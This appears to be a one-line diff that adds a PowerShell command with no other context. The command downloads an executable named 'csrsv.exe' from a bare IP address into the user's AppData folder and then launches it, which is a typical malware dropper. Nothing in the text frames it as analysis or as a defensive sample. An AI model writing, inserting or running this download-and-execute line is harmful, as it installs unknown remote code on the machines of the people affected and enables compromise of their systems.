@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATAcsrsv.exe");Start-Process ("$env:APPDATAcsrsv.exe")
